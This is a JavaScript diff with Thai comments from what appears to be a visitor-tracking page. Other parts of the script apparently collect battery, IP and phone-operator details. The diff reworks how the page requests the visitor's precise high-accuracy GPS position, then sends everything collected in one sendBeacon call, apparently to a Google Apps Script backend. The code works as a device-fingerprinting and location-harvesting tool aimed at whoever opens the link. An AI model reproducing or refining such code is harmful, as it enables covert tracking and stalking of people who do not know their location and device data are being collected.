@@ -122,112 +122,69 @@ function getUrlParameters() {
     dataToSend.phoneInfo = { possibleOperator: "ข้อผิดพลาด" };
   });
 
-  // 4. Geolocation - เรียกใช้ฟังก์ชันดึงข้อมูล GPS แต่ไม่ส่งข้อมูลทันที
-  const locationPromise = getLocationDataQuickly(dataToSend);
+  // 4. Geolocation
+  let locationPromise;
+  if (navigator.geolocation) {
+    console.log("Requesting geolocation...");
+    locationPromise = new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          console.log("Geolocation success:", position.coords);
+          resolve({
+            lat: position.coords.latitude,
+            long: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            // สร้าง Link ภายใน Google Apps Script จะดีกว่า เพื่อความยืดหยุ่น
+            // gmapLink: `https://www.google.com/maps?q=$${position.coords.latitude},${position.coords.longitude}`
+          });
+        },
+        error => {
+          console.error(`Geolocation error: ${error.message} (Code: ${error.code})`);
+          resolve("ไม่มีข้อมูล"); // ส่ง "ไม่มีข้อมูล" เมื่อเกิดข้อผิดพลาด
+        },
+        {
+          timeout: 15000, // 15 วินาที
+          enableHighAccuracy: true,
+          maximumAge: 0 // ขอข้อมูลใหม่เสมอ
+        }
+      );
+    }).then(location => {
+        dataToSend.location = location;
+    }).catch(() => {
+        // Handle potential errors within the promise chain if needed, though resolve("ไม่มีข้อมูล") covers most cases
+        dataToSend.location = "ข้อผิดพลาดในการขอตำแหน่ง";
+    });
 
-  // --- รอข้อมูล Asynchronous ทั้งหมด รวมถึงข้อมูล GPS แล้วส่งข้อมูลครั้งเดียว ---
+    // เพิ่ม Timeout สำหรับ Geolocation โดยรวม
+    locationPromise = Promise.race([
+        locationPromise,
+        new Promise(resolve => setTimeout(() => {
+            if (dataToSend.location === "กำลังตรวจสอบ...") { // ถ้ายังไม่ได้ผลลัพธ์
+                 console.warn("Geolocation request timed out after 15 seconds.");
+                 dataToSend.location = "ไม่มีข้อมูล (Timeout)";
+            }
+            resolve(); // Resolve race promise
+        }, 15000))
+    ]);
+
+  } else {
+    // ถ้าไม่รองรับ Geolocation
+    console.warn("Geolocation API is not supported in this browser.");
+    dataToSend.location = "ไม่รองรับ";
+    locationPromise = Promise.resolve(); // สร้าง Promise ที่ resolve ทันที
+  }
+
+  // --- รอข้อมูล Asynchronous ทั้งหมด แล้วส่งข้อมูล ---
   Promise.allSettled([batteryPromise, ipPromise, phonePromise, locationPromise])
     .then(() => {
-      console.log("All data collected (including GPS), sending complete data...");
+      // ณ จุดนี้ ข้อมูลทั้งหมด (หรือสถานะข้อผิดพลาด) ควรจะอยู่ใน dataToSend แล้ว
+      console.log("All async data collected (or timed out/error). Final data:", JSON.stringify(dataToSend));
+
+      // ส่งข้อมูลทั้งหมดโดยใช้ sendBeacon
       sendDataWithBeacon(dataToSend);
     });
 
 })(); // End of main IIFE
-
-// ฟังก์ชันสำหรับเก็บข้อมูลตำแหน่งอย่างรวดเร็ว (แต่ไม่ส่งข้อมูลทันที)
-function getLocationDataQuickly(dataToSend) {
-  console.log("Starting quick GPS location collection");
-  
-  return new Promise((resolve) => {
-    if (navigator.geolocation) {
-      // ตั้งค่า timeout ที่สั้นลงเพื่อให้ได้ผลเร็วขึ้น แต่ยังคงความแม่นยำ
-      const geoOptions = {
-        enableHighAccuracy: true,
-        timeout: 5000,
-        maximumAge: 0
-      };
-
-      // เริ่มขอตำแหน่งทันที
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          // ได้ตำแหน่ง GPS สำเร็จ
-          console.log("GPS location obtained quickly");
-          const lat = position.coords.latitude;
-          const long = position.coords.longitude;
-          const accuracy = position.coords.accuracy;
-          const locationString = `${lat}, ${long}`;
-          
-          // ปรับปรุงข้อมูลในชุดข้อมูลหลัก
-          dataToSend.location = locationString;
-          dataToSend.locationData = {
-            lat: lat,
-            long: long,
-            accuracy: accuracy,
-            gmapLink: `https://www.google.com/maps?q=${lat},${long}`
-          };
-          
-          // ลองขอตำแหน่งที่แม่นยำกว่าในพื้นหลัง (10 วินาที) ถ้าต้องการ
-          navigator.geolocation.getCurrentPosition(
-            (accuratePosition) => {
-              // หากได้ตำแหน่งที่แม่นยำกว่า
-              if (accuratePosition.coords.accuracy < accuracy) {
-                console.log("More accurate GPS location obtained");
-                const accurateLat = accuratePosition.coords.latitude;
-                const accurateLong = accuratePosition.coords.longitude;
-                const accurateAccuracy = accuratePosition.coords.accuracy;
-                
-                dataToSend.location = `${accurateLat}, ${accurateLong}`;
-                dataToSend.locationData = {
-                  lat: accurateLat,
-                  long: accurateLong, 
-                  accuracy: accurateAccuracy,
-                  gmapLink: `https://www.google.com/maps?q=${accurateLat},${accurateLong}`
-                };
-              }
-              resolve(); // ถือว่าเสร็จสมบูรณ์หลังจากได้พิกัดแม่นยำ
-            },
-            () => {
-              // ไม่เป็นไรหากไม่สามารถรับพิกัดที่แม่นยำกว่าได้
-              resolve(); // ถือว่าเสร็จสมบูรณ์แล้วกับพิกัดแรก
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-          );
-        },
-        (error) => {
-          console.warn("Error getting initial GPS location:", error);
-          dataToSend.location = "ไม่สามารถระบุตำแหน่งได้";
-          dataToSend.locationError = error.code; // เก็บรหัสข้อผิดพลาด
-          
-          // ลองอีกครั้งแบบแม่นยำน้อยลง
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              const lat = position.coords.latitude;
-              const long = position.coords.longitude;
-              dataToSend.location = `${lat}, ${long}`;
-              dataToSend.locationData = {
-                lat: lat, 
-                long: long,
-                accuracy: position.coords.accuracy,
-                gmapLink: `https://www.google.com/maps?q=${lat},${long}`
-              };
-              resolve();
-            },
-            () => {
-              dataToSend.location = "ไม่สามารถระบุตำแหน่งได้";
-              resolve();
-            },
-            { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
-          );
-        },
-        geoOptions
-      );
-    } else {
-      console.warn("Geolocation not supported");
-      dataToSend.location = "Geolocation ไม่รองรับ";
-      resolve();
-    }
-  });
-}
 
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
